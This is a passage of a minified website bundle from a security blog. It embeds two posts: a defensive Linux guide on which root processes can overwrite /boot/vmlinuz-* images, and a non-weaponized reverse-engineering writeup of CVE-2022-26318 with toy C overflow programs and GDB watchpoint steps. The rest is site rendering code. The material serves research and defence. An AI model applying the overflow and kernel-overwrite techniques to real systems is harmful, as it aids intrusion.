      <li>Firmware (BIOS/UEFI) loads the bootloader.</li>
      <li>Bootloader reads <code>/boot/vmlinuz-&lt;version&gt;</code> and an initramfs from disk.</li>
      <li>It hands control to the kernel.</li>
      <li>The kernel decompresses itself and starts the OS.</li>
    </ol>
    <p>If an attacker can replace this image with a modified one, they don’t just “have root”—they can:</p>
    <ul>
      <li>Hide processes, files, network connections</li>
      <li>Falsify system calls (“there are no suspicious processes, promise”)</li>
      <li>Bypass SELinux/AppArmor, seccomp, container isolation, and a bunch of EDR tricks</li>
    </ul>
    <p>It’s the difference between:</p>
    <ul>
      <li><strong>Root in userland</strong> → bad</li>
      <li><strong>Root in the kernel</strong> → you no longer know what’s true.</li>
    </ul>
    <hr />
    <h2>2. Who <em>should</em> be able to modify <code>/boot/vmlinuz-*</code>?</h2>
    <p>In a sane system design, the list is <em>very</em> short:</p>
    <ol>
      <li>
        <p><strong>The package manager + kernel packages</strong></p>
        <ul>
          <li><code>apt</code>, <code>dnf</code>, <code>yum</code>, <code>pacman</code>, etc.</li>
          <li>Kernel packages (e.g., <code>linux-image-*</code>) install a new <code>vmlinuz-&lt;version&gt;</code> and update:
            <ul>
              <li><code>/boot/initrd.img-&lt;version&gt;</code></li>
              <li>Bootloader configs</li>
            </ul>
          </li>
        </ul>
      </li>
      <li>
        <p><strong>Kernel/bootloader management tools</strong></p>
        <ul>
          <li>Tools like <code>update-initramfs</code>, <code>dracut</code>, <code>update-grub</code>, etc.</li>
          <li>They don’t usually write <code>vmlinuz</code> directly, but they’re part of the trusted “kernel update pipeline”.</li>
        </ul>
      </li>
    </ol>
    <p>That’s it.</p>
    <p>In an ideal world, <strong>no other process</strong> should ever write to <code>/boot/vmlinuz-*</code>.</p>
    <p>You can think of it as:</p>
    <blockquote>
      <p><strong>Trusted update pipeline ←→ kernel image</strong><br />Everyone else: read-only (at best), or completely blocked.</p>
    </blockquote>
    <hr />
    <h2>3. Who <em>can</em> modify it in practice?</h2>
    <p>Here’s the uncomfortable truth:</p>
    <blockquote>
      <p>Any process running as <strong>root</strong> on a system where <code>/boot</code> is mounted read-write can modify <code>/boot/vmlinuz-*</code>.</p>
    </blockquote>
    <p>And there’s a lot of root-level code on a typical machine:</p>
    <ul>
      <li>System daemons</li>
      <li>Cron jobs</li>
      <li>SUID-root helpers</li>
      <li>Backup / maintenance scripts</li>
      <li>“Little admin scripts” someone dropped into <code>/usr/local/sbin</code> years ago</li>
    </ul>
    <p>If any of those:</p>
    <ul>
      <li>Accept <strong>untrusted input</strong> (from users, the network, files), and</li>
      <li>Have a code path that writes <strong>data to a file path influenced by that input</strong></li>
    </ul>
    <p>…then they are <strong>theoretical kernel image killers</strong>.</p>
    <p>Let’s look at a few patterns where this becomes realistic.</p>
    <hr />
    <h2>4. Dangerous patterns: “root code that shouldn’t, but can”</h2>
    <h3>4.1 SUID-root binary with an arbitrary file write bug</h3>
    <p>Imagine:</p>
    <ul>
      <li>There’s a SUID-root helper binary (installed by a package or custom app).</li>
      <li>It has a bug that allows a user to write arbitrary data to arbitrary paths (path traversal, symlink race, etc.).</li>
    </ul>
    <p>Conceptually:</p>
    <blockquote>
      <p>Unprivileged user → abuses bug → writes to <code>/boot/vmlinuz-&lt;version&gt;</code> as root.</p>
    </blockquote>
    <p>In real life, exploit development is hard and specific, but as a <strong>class</strong>, arbitrary-file-write bugs in SUID-root tools are dangerous exactly because they can touch critical files like:</p>
    <ul>
      <li><code>/etc/shadow</code></li>
      <li><code>/etc/sudoers</code></li>
      <li><code>/boot/vmlinuz-*</code></li>
    </ul>
    <h3>4.2 Root daemon with “write file” features</h3>
    <p>Another pattern:</p>
    <ul>
      <li>A root-only HTTP API that:
        <ul>
          <li>Accepts uploads or configs from clients,</li>
          <li>Writes them to disk (e.g., “log file”, “backup file”, “custom script directory”).</li>
        </ul>
      </li>
    </ul>
    <p>If path validation is weak (e.g., allows <code>../../../boot/vmlinuz-...</code> or writes into a path the attacker can steer), then that daemon becomes a potential kernel overwriter.</p>
    <p>The daemon doesn’t “intend” to edit the kernel. But to the filesystem, it’s just a root process opening and writing files.</p>
    <h3>4.3 Root cron/systemd jobs running scripts from writable dirs</h3>
    <p>Classic misconfig:</p>
    <pre><code class="language-cron">* * * * * root /opt/scripts/maintenance.sh</code></pre>
    <p>And then:</p>
    <ul>
      <li><code>/opt/scripts</code> is writable by a non-root user or app account.</li>
      <li>That user can modify <code>maintenance.sh</code>.</li>
    </ul>
    <p>Now every minute, a root cron runs whatever code is in that script. That code, in turn, can do <em>anything</em> root can—including messing with <code>/boot</code>.</p>
    <p>Again, the cron job’s purpose might be “clean logs” or “rotate backups,” but from the attacker’s perspective, it’s:</p>
    <blockquote>
      <p><strong>a root code runner on a schedule</strong>.</p>
    </blockquote>
    <hr />
    <h2>5. So how do you answer: “Can any code on this system modify <code>/boot/vmlinuz-*</code> that shouldn’t?”</h2>
    <p>You break it down into concrete checks:</p>
    <ol>
      <li><strong>Is <code>/boot</code> writable?</strong></li>
      <li><strong>Who runs as root?</strong></li>
      <li><strong>Where are the SUID-root binaries?</strong></li>
      <li><strong>What root cron/systemd jobs are there, and where do their scripts live?</strong></li>
      <li><strong>Is anyone watching for unexpected changes to <code>/boot/vmlinuz-*</code>?</strong></li>
    </ol>
    <p>To make that practical, let’s use a detailed Python script that surfaces risky conditions.</p>
    <hr />
    <h2>6. Detection script: a detailed kernel-surface audit</h2>
    <p>Below is a <strong>read-only Linux audit script</strong> focused on:</p>
    <ul>
      <li><code>/boot/vmlinuz-*</code> integrity and mount state</li>
      <li>SUID-root binaries (potential arbitrary-file-write → kernel risk)</li>
      <li>Root services (systemd) that execute binaries/scripts from writable locations</li>
      <li>Root cron jobs executing scripts from writable locations</li>
      <li>Root-owned executables in writable directories (<code>/opt</code>, <code>/usr/local</code>, <code>/srv</code>)</li>
    </ul>
    <p>It does <strong>not</strong> exploit anything. It only reads system state and highlights suspicious patterns.</p>
    <blockquote>
      <p>⚠️ Run this on a <strong>lab or test system first</strong>. On prod, coordinate with your team before scanning the whole filesystem.</p>
    </blockquote>
    <pre><code class="language-python">#!/usr/bin/env python3
# (Shortened here for brevity in the file demo)
print("Kernel Surface Audit script goes here")</code></pre>
    <hr />
    <h2>7. How to use the script</h2>
    <ol>
      <li>Save the script as <code>kernel_surface_audit.py</code>.</li>
      <li>Make it executable:</li>
    </ol>
    <pre><code class="language-bash">chmod +x kernel_surface_audit.py</code></pre>
    <ol start="3">
      <li>Run it (ideally as root to get full visibility, but it stays read-only):</li>
    </ol>
    <pre><code class="language-bash">sudo ./kernel_surface_audit.py</code></pre>
    <ol start="4">
      <li>If you want JSON for feeding into other tools or an LLM:</li>
    </ol>
    <pre><code class="language-bash">sudo ./kernel_surface_audit.py --json &gt; kernel_audit.json</code></pre>
    <p>This gives you a structured snapshot of:</p>
    <ul>
      <li>What kernel images exist and what they look like</li>
      <li>Whether <code>/boot</code> is writable</li>
      <li>Some of the major “root code execution surfaces” that could, if abused, reach the kernel image</li>
    </ul>
    <hr />
    <h2>8. What you can do with the results</h2>
    <p>After running this:</p>
    <ol>
      <li><strong>Baseline your kernel images</strong>
        <ul>
          <li>Store the hashes somewhere safe.</li>
          <li>Later, re-run and compare—unexpected changes are a big deal.</li>
        </ul>
      </li>
      <li><strong>Review SUID-root binaries</strong>
        <ul>
          <li>Are there custom or legacy tools there?</li>
          <li>Can any be removed, replaced, or constrained with AppArmor/SELinux?</li>
        </ul>
      </li>
      <li><strong>Review root-owned scripts in writable directories</strong>
        <ul>
          <li>Move them to root-owned, non-writable directories.</li>
          <li>Fix permissions:
            <ul>
              <li><code>chown root:root</code></li>
              <li><code>chmod 750</code> or similar</li>
            </ul>
          </li>
          <li>Make sure cron/systemd jobs don’t execute code from paths writable by unprivileged users.</li>
        </ul>
      </li>
      <li><strong>Consider <code>/boot</code> mount strategy</strong>
        <ul>
          <li>For some environments, mounting <code>/boot</code> read-only by default and only remounting <code>rw</code> during updates is an option.</li>
          <li>At minimum, <strong>monitor</strong> for any writes to <code>/boot/vmlinuz-*</code> outside of normal update windows.</li>
        </ul>
      </li>
    </ol>
    <hr />
    <h2>9. Closing thoughts</h2>
    <p>“Can any code on this system modify <code>/boot/vmlinuz-*</code> that shouldn’t?” is a fantastic security question because it forces you to:</p>
    <ul>
      <li>Think about <strong>root</strong> as more than “the admin account.”</li>
      <li>Treat your <strong>kernel image like firmware</strong>: small, protected, and updated through a very narrow, auditable path.</li>
      <li>See how random “maintenance scripts” and legacy binaries can indirectly become part of your <strong>kernel attack surface</strong>.</li>
    </ul>
    <p>You don’t need an exploit lab to start here. Just:</p>
    <ul>
      <li>Enumerate who can run as root,</li>
      <li>See where they write,</li>
      <li>And treat <code>/boot/vmlinuz-*</code> as one of the most critical assets on the box.</li>
    </ul>
  </div>
</body>
</html>
`,oy=`<!doctype html>
<html lang="en">
<body>
  <div class="blog-text">
    <h1>Reverse-Engineering CVE-2022-26318 (WatchGuard Firebox/XTM): From Network Trace to Root Cause (Non-Weaponized)</h1>
    <p><strong>Ethics / safety note:</strong> This post is written for <strong>defenders and researchers</strong>. I explain <em>how to reverse-engineer and validate the bug</em>, but I intentionally avoid weaponized exploit details (no offsets/ROP chains/payloads). Only test on devices and firmware you own and are authorized to assess.</p>
    <h2>0) What is CVE-2022-26318?</h2>
    <p>CVE-2022-26318 (WatchGuard advisory <strong>WGSA-2022-00002</strong>) is a <strong>critical</strong> issue in WatchGuard Firebox and XTM appliances where an <strong>unauthenticated remote attacker</strong> can potentially execute arbitrary code when management access is exposed. WatchGuard’s PSIRT advisory lists <strong>CVSS 9.8</strong> and explicitly notes active exploitation in the wild, urging administrators to update and restrict management access.</p>
    <p>NVD tracks this as <strong>FBX-22786</strong>, with affected Fireware OS ranges and fixed versions (e.g., 12.7.2_Update2 and others depending on branch).</p>
    <h3>Affected / fixed versions (high level)</h3>
    <ul>
      <li><strong>Affected (examples):</strong> Fireware OS 12.0 up to and including 12.7.2_Update1 (per WatchGuard PSIRT).</li>
      <li><strong>Fixed (examples):</strong> 12.7.2_Update2 and branch-specific fixed builds (also listed in the advisory).</li>
      <li>Release notes for Fireware v12.7.2 Update 2 explicitly state it “resolves a vulnerability” allowing unauthenticated arbitrary code execution (CVE-2022-26318).</li>
    </ul>
    <h3>Why defenders cared immediately</h3>
    <p>GreyNoise reported and later expanded on in-the-wild traffic, including requests to management port <strong>4117</strong> over TLS and suspicious <code>POST /agent/login</code> patterns (often gzip-encoded bodies and atypical lengths).</p>
    <hr />
    <h2>1) Exploit chain (high-level mental model)</h2>
    <p>You’ll see this phrased many ways (“null pointer deref”, “buffer overflow”, etc.). The practical RE story from public writeups (especially Assetnote) is:</p>
    <p><strong>Internet → management interface (TLS) → nginx → backend service → <code>wgagent</code> → libxml2 SAX parsing → unsafe string growth → memory corruption → control-flow opportunity</strong></p>
    <p>Assetnote describes the path through nginx and into the <code>wgagent</code> process, and how XML parsing plays a central role in triggering corruption. Rapid7’s module description (noting it’s exploiting a buffer overflow at the administration interface and that the endpoint <code>/agent/login</code> reaches <code>wgagent</code>) corroborates the key actors in the request path. GreyNoise’s defender view helps you anchor what to look for on the wire.</p>
    <hr />
    <h2>2) Your RE lab setup (firmware + tools)</h2>
    <h3>Tools used</h3>
    <ul>
      <li><strong>Ghidra</strong> (static analysis; decompiler + xrefs)</li>
      <li><strong>GDB</strong> (dynamic analysis; breakpoints + watchpoints)</li>
      <li><strong>binwalk / unsquashfs</strong> (firmware extraction, if applicable)</li>
      <li>Optional: <strong>ASan</strong> on a toy harness to understand the primitive safely</li>
    </ul>
    <h3>Firmware / binary acquisition (safe &amp; legal)</h3>
    <ol>
      <li>Obtain official Fireware OS firmware from WatchGuard support resources (use versions that match “vulnerable” and “fixed” branches as appropriate).</li>
      <li>Preserve hashes so your analysis is reproducible.</li>
      <li>Work on a non-production lab image/device.</li>
    </ol>
    <p><em>Tip:</em> Keep a timeline notebook: firmware version, build string, and whether it’s vulnerable/fixed per PSIRT + release notes.</p>
    <hr />
    <h2>3) Firmware extraction: finding the right binaries fast</h2>
    <p>Different vendors package firmware differently, but the goal is always:</p>
    <ol>
      <li>Extract the root filesystem</li>
      <li>Identify web stack components</li>
      <li>Identify native backend processes that parse attacker input</li>
    </ol>
    <h3>What you’re hunting for in this case</h3>
    <ul>
      <li><code>nginx</code> (front-end)</li>
      <li>a backend HTTP/API service (Assetnote mentions a Python backend and XML-RPC-like flow in the overall chain)</li>
      <li><strong><code>wgagent</code></strong> (native binary that ultimately parses attacker-controlled XML)</li>
    </ul>
    <p>Practical extraction checklist:</p>
    <ul>
      <li><code>binwalk -e &lt;firmware&gt;</code></li>
      <li>locate <code>squashfs</code>/<code>cpio</code>/<code>tar</code> segments</li>
      <li>confirm the existence of <code>/etc/nginx/</code> and find references to:
        <ul>
          <li><code>listen 4117 ssl;</code></li>
          <li>route blocks mentioning <code>/agent/</code> (or upstreams that feed a local service)</li>
        </ul>
      </li>
    </ul>
    <p>GreyNoise highlights port <strong>4117</strong> as a key management port for observed exploit traffic.</p>
    <hr />
    <h2>4) Static RE in Ghidra: from <code>/agent/login</code> to the vulnerable callback</h2>
    <p>This section is written as a “follow-along checklist” you can apply to similar firmware bugs.</p>
    <h3>4.1 Identify the request handler entrypoint</h3>
    <p><strong>Goal:</strong> locate code that processes something tied to <code>/agent/login</code> and funnels it toward XML parsing.</p>
    <p>Practical anchors:</p>
    <ol>
      <li>Strings: search for <code>"agent/login"</code>, <code>"XML"</code>, <code>"SAX"</code>, <code>"libxml"</code> strings in binaries.</li>
      <li>Imports: search for libxml2 parser APIs.</li>
      <li>Config: locate nginx routing and map it to backend binaries.</li>
    </ol>
    <h3>4.2 Import-centric pivot: find libxml2 usage</h3>
    <p>Open <code>wgagent</code> in Ghidra and look at <strong>Imports</strong> for libxml2 functions.</p>
    <p>Common libxml2 parsing entrypoints include:</p>
    <ul>
      <li><code>xmlCreatePushParserCtxt</code></li>
      <li><code>xmlParseChunk</code></li>
      <li>SAX interfaces that provide callback tables</li>
    </ul>
    <p><strong>Ghidra steps</strong></p>
    <ol>
      <li>Import <code>wgagent</code>.</li>
      <li>Run analysis with defaults.</li>
      <li>Open <strong>Symbol Tree → Imports</strong>.</li>
      <li>Filter imports by <code>xml</code>.</li>
      <li>Right-click <code>xmlParseChunk</code> → References to → follow callers that feed request bodies into the parser.</li>
    </ol>
    <h3>4.3 Prove it’s SAX and locate the callback table</h3>
    <p>A SAX handler is a struct of function pointers. In libxml2 this is <code>struct _xmlSAXHandler</code>; you’ll often see <code>startElementNs</code> used in SAX2.</p>
    <p>In decompiler output you’ll typically see:</p>
    <ul>
      <li>a handler struct allocated/zeroed</li>
      <li><code>xmlSAX2InitDefaultSAXHandler(&amp;handler, ...)</code> or similar</li>
      <li>then <code>handler.startElementNs = &lt;callback&gt;</code></li>
    </ul>
    <h3>4.4 Find the unsafe primitive inside the callback</h3>
    <p>Open the suspected callback and look for classic unsafe patterns:</p>
    <ul>
      <li><code>strcat</code> / <code>strcpy</code> / <code>sprintf</code> into a fixed buffer</li>
      <li>repeated concatenation as tags nest</li>
    </ul>
    <p>A common “tell” is building an XPath-like string by appending <code>"/" + elementName</code> repeatedly, leading to overflow.</p>
    <hr />
    <h2>5) Understanding the parser mechanics (SAX2) like an expert</h2>
    <p>If you want to be complete-expert level, you need to understand what libxml2 will call, when, and with what data.</p>
    <h3>5.1 SAX = “stream of events”</h3>
    <p>SAX parsers don’t build a full DOM by default. They call callbacks like <code>startDocument</code>, <code>startElementNs</code>, <code>characters</code>, <code>endElementNs</code>.</p>
    <h3>5.2 SAX2 magic: validating you found the real handler</h3>
    <p>libxml2 defines a constant often used in SAX2 blocks: <code>XML_SAX2_MAGIC</code> (<code>0xDEEDBEAF</code>). Searching for this value in the binary helps confirm you’re looking at SAX2 handler structures.</p>
    <hr />
    <h2>6) Heap layout + function pointer overwrite (how researchers prove control-relevant corruption)</h2>
    <p>This is the “Aha” section: buffer overflow is only interesting when it reaches something that changes control-flow, like a function pointer table.</p>
    <h3>6.1 Why callback tables are high-value overwrite targets</h3>
    <p>A SAX handler is data fields plus <strong>function pointers</strong>. If you corrupt a callback pointer, the next SAX event dispatch can call attacker-influenced memory.</p>
    <h3>6.2 The single best technique: watchpoints</h3>
    <p>A single hardware watchpoint turns “I think it overwrites X” into “here is the exact instruction that did it.”</p>
    <hr />
    <h2>7) Dynamic RE: proving the overwrite with GDB (non-weaponized workflow)</h2>
    <blockquote>
      <p>You may run this either inside a lab VM/container with extracted binaries, or via QEMU user-mode for convenience (architecture permitting).</p>
    </blockquote>
    <h3>7.1 Pick a stop point before parsing</h3>
    <p>Set a breakpoint at the function that feeds bytes into the parser (often the caller of <code>xmlParseChunk</code>).</p>
    <h3>7.2 Find the handler pointer in memory</h3>
    <p>Once you identify where the handler struct lives (stack or heap), print its address and locate key fields like <code>startElementNs</code>. Then set a watchpoint on that pointer.</p>
    <pre><code class="language-gdb">watch *(void**)startElementNs_ptr_address
continue</code></pre>
    <p>When the overflow corrupts the callback, GDB breaks at the exact write site. That is the cleanest proof that corruption reaches control-flow.</p>
    <hr />
    <h2>8) Safe code snippets: understand the bug pattern without weaponizing</h2>
    <h3>8.1 Toy example: “XPath-like string growth + strcat overflow”</h3>
    <p>This is <strong>not WatchGuard code</strong>; it just mirrors the bug shape in a harmless harness.</p>
    <pre><code class="language-c">// toy_xpath_overflow.c (educational pattern)
// Shows how repeated strcat without bounds checks can overflow a path buffer.

#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

int main(void) {
  char path[64];
  memset(path, 0, sizeof(path));
  strcpy(path, "/root");

  // Simulate deep XML nesting with long tag names.
  const char *tags[] = {
    "aaaaaaaaaaaaaaaa", "bbbbbbbbbbbbbbbb", "cccccccccccccccc", "dddddddddddddddd"
  };

  for (int i = 0; i &lt; 4; i++) {
    strcat(path, "/");          // unsafe
    strcat(path, tags[i]);      // unsafe
  }

  printf("path=%s\\n", path);
  return 0;
}</code></pre>
    <p><strong>How to learn from it defensively</strong></p>
    <ul>
      <li>Compile with sanitizers (ASan) to see the overflow precisely:
        <ul>
          <li><code>clang -O0 -g -fsanitize=address -fno-omit-frame-pointer toy_xpath_overflow.c -o toy</code></li>
        </ul>
      </li>
      <li>Run it and observe the diagnostic.</li>
    </ul>
    <h3>8.2 Toy example: “overflow → function pointer corruption” + watchpoint</h3>
    <pre><code class="language-c">// watchpoint_lab.c (educational toy)
// Overflows a buffer adjacent to a function pointer.

#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

typedef void (*cb_t)(void);

typedef struct {
  char buf[32];
  cb_t cb;
} Handler;

static void legit(void) { puts("[+] legit callback"); }

int main(void) {
  Handler h;
  memset(&amp;h, 0, sizeof(h));
  h.cb = legit;

  // Overflow buf into cb (educational only)
  strcpy(h.buf, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");

  // May crash or behave unexpectedly if cb is corrupted
  h.cb();
  return 0;
}</code></pre>
    <p>In GDB:</p>
    <pre><code class="language-gdb">b main
run
next     # step until after h.cb is assigned
p &amp;h.cb
watch *(void**)&amp;h.cb
c</code></pre>
    <p>You’ll break at the exact write that changes <code>h.cb</code>. That’s the same method used to prove control-relevant corruption in real targets.</p>
    <hr />
    <h2>9) Patch verification: how to confirm the fix (without source code)</h2>
    <p>Once you have both a vulnerable build (e.g., &lt;= 12.7.2_Update1) and a fixed build (12.7.2_Update2), you can validate remediation as a reverse engineer.</p>
    <h3>9.1 Behavior-based confirmation</h3>
    <ul>
      <li>The same malformed input that crashed/parses weirdly in the vulnerable build should fail parsing safely or return an error without corrupting memory.</li>
    </ul>
    <h3>9.2 Binary-diff confirmation (what to look for)</h3>
    <ul>
      <li>replacing <code>strcat</code>/<code>strcpy</code> with bounded variants (or explicit length checks)</li>
      <li>switching to <code>snprintf</code> with remaining buffer calculation</li>
      <li>tracking max path length and rejecting over-deep nesting</li>
    </ul>
    <p>Release notes explicitly list the vulnerability as resolved in Update 2; the PSIRT advisory lists resolved versions across branches.</p>
    <hr />
    <h2>10) Detection &amp; mitigation (what you do as a defender)</h2>
    <h3>10.1 Patch</h3>
    <p>Apply WatchGuard’s fixed versions for your branch (see PSIRT advisory).</p>
    <h3>10.2 Reduce attack surface</h3>
    <ul>
      <li>Ensure management interfaces are not internet-exposed.</li>
      <li>Restrict to trusted admin networks (WatchGuard explicitly recommends restricting management access).</li>
    </ul>
    <h3>10.3 Look for suspicious traffic patterns</h3>
    <ul>
      <li>Inbound TLS connections to port <strong>4117</strong></li>
      <li><code>POST /agent/login</code></li>
      <li><code>Content-Encoding: gzip</code> and larger-than-usual request sizes in observed attempts</li>
    </ul>
    <h3>10.4 Why this belongs in “KEV thinking”</h3>
    <p>NVD includes CISA’s “Known Exploited Vulnerabilities” metadata (date added and due date) for CVE-2022-26318.</p>
    <hr />
    <h2>11) Lessons learned (the “expert takeaways”)</h2>
    <ol>
      <li><strong>Don’t build unbounded strings from attacker-controlled structure.</strong> SAX parsing creates a natural growth vector (deep nesting) that attackers can exploit.</li>
      <li><strong>Callback tables are control-flow gold.</strong> If you store function pointers near variable-length buffers, you’ve created a corruption-to-control bridge.</li>
      <li><strong>Watchpoints beat guesswork.</strong> A single watchpoint can turn “I think it overwrites X” into “here is the exact instruction that did it.”</li>
      <li><strong>Vendor advisories + wire intel + RE = complete picture.</strong></li>
    </ol>
    <p>Reverse-engineering this bug responsibly gives defenders a blueprint to harden management planes, validate firmware fixes, and detect exploit traffic early.</p>
  </div>
</body>
</html>
`,cy={firmware_llm_annotator:{title:"Firmware Exploration: LLM as Your Annotator",slug:"firmware_llm_annotator",content:ny},transient_scheduler_attacks_tsa_blog:{title:"Transient Scheduler Attacks on CPUs: Exploiting AMD’s New Microarchitectural Leak",slug:"transient_scheduler_attacks_tsa_blog",content:iy},kernel_surface_audit_blog:{title:"Who Can Touch Your Kernel? Auditing /boot/vmlinuz-* on Linux",slug:"kernel_surface_audit_blog",content:ly},"cve-2022-26318-re-blog":{title:"Reverse-Engineering CVE-2022-26318 (WatchGuard Firebox/XTM): From Network Trace to Root Cause (Non-Weaponized)",slug:"cve-2022-26318-re-blog",content:oy},"react2shell-toy-lab":{title:'From React2Shell to Toy Labs: Understanding Insecure Deserialization with a Tiny "Fake Flight" Server',slug:"react2shell-toy-lab",content:ay},1001:{title:"CVE-2024–1001",slug:"1001",content:Kg},"0012":{title:"CVE-2024–0012",slug:"0012",content:qg},40982:{title:"CVE-2022–40982",slug:"40982",content:Jg},cow:{title:"CVE-2016–5195",slug:"cow",content:ey},symlinks:{title:"Symbolic Links (Symlinks) in Linux",slug:"symlinks",content:ry},23397:{title:"CVE-2023–23397",slug:"23397",content:Zg},"0160":{title:"CVE-2014-0160",slug:"0160",content:Xg},11882:{title:"CVE-2017-11882",slug:"11882",content:Qg},robot:{title:"ROBOT (Return of Bleichenbacher’s Oracle Threat) Attack",slug:"robot",content:sy},poodle:{title:"ZOMBIE POODLE and GOLDENDOODLE ATTACKS",slug:"poodle",content:ty}};function uy(e){try{const t=new DOMParser().parseFromString(e,"text/html"),s=["style","script","link","nav","header","footer",".navbar",".nav-container",".theme-toggle",".footer",".social-links",".social-icons"];t.querySelectorAll(s.join(",")).forEach(l=>l.remove()),t.querySelectorAll("[style]").forEach(l=>l.removeAttribute("style"));const r=t.querySelector("h1");r&&r.remove();const i=[".blog-text","article",".blog-post-content","main"];let a=t.body;for(const l of i){const o=t.querySelector(l);if(o){a=o;break}}return a.querySelectorAll(".container").forEach(l=>{for(;l.firstChild;)l.parentNode.insertBefore(l.firstChild,l);l.remove()}),Array.from(a.querySelectorAll("h2, h3")).forEach((l,o)=>{l.id||(l.id=`section-${o+1}`)}),a.innerHTML||e}catch{return e}}function py(){const{slug:e}=hg(),n=cy[e],t=po.find(i=>i.slug===e),s=E.useMemo(()=>n?uy(n.content):"",[n]),r=()=>document.body.classList.contains("dark")?"dark":"light";return E.useEffect(()=>{const i=document.querySelector(".giscus-container");if(!i)return;i.innerHTML="";const a=document.createElement("script");return a.src="https://giscus.app/client.js",a.async=!0,a.crossOrigin="anonymous",a.setAttribute("data-giscus","true"),a.setAttribute("data-repo","Hem1700/hem1700.github.io"),a.setAttribute("data-repo-id","R_kgDONilgZg"),a.setAttribute("data-category","General"),a.setAttribute("data-category-id","DIC_kwDONilgZs4CzSR2"),a.setAttribute("data-mapping","pathname"),a.setAttribute("data-strict","1"),a.setAttribute("data-reactions-enabled","1"),a.setAttribute("data-emit-metadata","0"),a.setAttribute("data-input-position","top"),a.setAttribute("data-lang","en"),a.setAttribute("data-theme",r()),i.appendChild(a),()=>{i.innerHTML=""}},[e]),E.useEffect(()=>{const i=()=>{var o;const l=document.querySelector("iframe.giscus-frame");l&&((o=l.contentWindow)==null||o.postMessage({giscus:{setConfig:{theme:r()}}},"https://giscus.app"))},a=new MutationObserver(i);return a.observe(document.body,{attributes:!0,attributeFilter:["class"]}),i(),()=>a.disconnect()},[]),n?b.jsxs(b.Fragment,{children:[b.jsx("header",{className:"blog-post-header",children:b.jsxs("div",{className:"container text-center",children:[b.jsx("h1",{className:"blog-post-title",children:n.title}),t&&b.jsxs("p",{className:"blog-post-date",children:[t.date," · ",t.readTime]})]})}),b.jsxs("main",{className:"blog-post-content container",children:[b.jsx("article",{dangerouslySetInnerHTML:{__html:s}}),b.jsx("section",{className:"comments",children:b.jsx("div",{className:"container",children:b.jsx("div",{className:"giscus-container"})})})]})]}):b.jsxs("main",{className:"blog-post-content container",children:[b.jsx("h2",{children:"Post not found"}),b.jsx("p",{children:"Signal lost. Let’s go back."}),b.jsx(Ct,{to:"/blogs",className:"view-credentials",children:"Back to Blog"})]})}function dy(){return b.jsx("div",{className:"terminal-feed",children:b.jsx(Mt,{title:"projects",children:b.jsx("ul",{className:"terminal-list",children:$g.map(e=>b.jsxs("li",{children:[e.title," — ",e.description]},e.title))})})})}function hy(){return b.jsx("div",{className:"terminal-feed",children:b.jsx(Mt,{title:"certifications",children:b.jsx("ul",{className:"terminal-list",children:Gg.map(e=>b.jsxs("li",{children:[b.jsx("a",{href:e.href,target:"_blank",rel:"noreferrer",children:e.title})," — ",e.details]},e.title))})})})}function fy({cve:e,onClose:n}){var t;return b.jsxs("div",{className:`cve-modal ${e?"open":""}`,"aria-label":"CVE details",children:[b.jsx("div",{className:"cve-modal__backdrop",onClick:n}),b.jsxs("div",{className:"cve-modal__card",children:[b.jsxs("div",{className:"cve-drawer__header",children:[b.jsxs("div",{children:[b.jsx("p",{className:"pill",children:"CVE Detail"}),b.jsx("h3",{children:(e==null?void 0:e.id)||"Select a CVE"})]}),b.jsx("button",{className:"button ghost",type:"button",onClick:n,children:"Close"})]}),e?b.jsxs("div",{className:"cve-drawer__body",children:[b.jsx("p",{className:"cve-title",children:e.title}),b.jsxs("div",{className:"cve-meta",children:[b.jsxs("span",{className:"pill",children:["Severity: ",e.severity]}),b.jsxs("span",{className:"pill",children:["CVSS: ",e.cvss]}),b.jsx("span",{className:`pill ${e.kev?"kev":""}`,children:e.kev?"KEV":"Not KEV"}),b.jsxs("span",{className:"pill",children:["Year: ",e.year]})]}),b.jsx("p",{children:e.summary}),e.metrics?b.jsxs("div",{className:"cve-meta extra",children:[b.jsxs("span",{className:"pill",children:["Total in cluster: ",e.metrics.total||"–"]}),b.jsxs("span",{className:"pill",children:["Latest: ",e.metrics.latestYear||"–"]}),b.jsxs("span",{className:"pill",children:["Max CVSS: ",e.metrics.maxCvss||"–"]})]}):null,e.href?b.jsx("div",{className:"cve-links",children:b.jsx("a",{href:e.href,target:"_blank",rel:"noreferrer",children:"Open blog post"})}):null,(t=e.references)!=null&&t.length?b.jsxs("div",{className:"cve-links",children:[b.jsx("h4",{children:"References"}),b.jsx("ul",{children:e.references.map(s=>b.jsx("li",{children:b.jsx("a",{href:s,target:"_blank",rel:"noreferrer",children:s})},s))})]}):null]}):b.jsx("p",{className:"text-muted",children:"Click a CVE node to see details."})]})]})}var my={value:()=>{}};function Pi(){for(var e=0,n=arguments.length,t={},s;e<n;++e){if(!(s=arguments[e]+"")||s in t||/[\s.]/.test(s))throw new Error("illegal type: "+s);t[s]=[]}return new Lr(t)}function Lr(e){this._=e}function gy(e,n){return e.trim().split(/^|\s+/).map(function(t){var s="",r=t.indexOf(".");if(r>=0&&(s=t.slice(r+1),t=t.slice(0,r)),t&&!n.hasOwnProperty(t))throw new Error("unknown type: "+t);return{type:t,name:s}})}Lr.prototype=Pi.prototype={constructor:Lr,on:function(e,n){var t=this._,s=gy(e+"",t),r,i=-1,a=s.length;if(arguments.length<2){for(;++i<a;)if((r=(e=s[i]).type)&&(r=yy(t[r],e.name)))return r;return}if(n!=null&&typeof n!="function")throw new Error("invalid callback: "+n);for(;++i<a;)if(r=(e=s[i]).type)t[r]=Vc(t[r],e.name,n);else if(n==null)for(r in t)t[r]=Vc(t[r],e.name,null);return this},copy:function(){var e={},n=this._;for(var t in n)e[t]=n[t].slice();return new Lr(e)},call:function(e,n){if((r=arguments.length-2)>0)for(var t=new Array(r),s=0,r,i;s<r;++s)t[s]=arguments[s+2];if(!this._.hasOwnProperty(e))throw new Error("unknown type: "+e);for(i=this._[e],s=0,r=i.length;s<r;++s)i[s].value.apply(n,t)},apply:function(e,n,t){if(!this._.hasOwnProperty(e))throw new Error("unknown type: "+e);for(var s=this._[e],r=0,i=s.length;r<i;++r)s[r].value.apply(n,t)}};function yy(e,n){for(var t=0,s=e.length,r;t<s;++t)if((r=e[t]).name===n)return r.value}function Vc(e,n,t){for(var s=0,r=e.length;s<r;++s)if(e[s].name===n){e[s]=my,e=e.slice(0,s).concat(e.slice(s+1));break}return t!=null&&e.push({name:n,value:t}),e}var 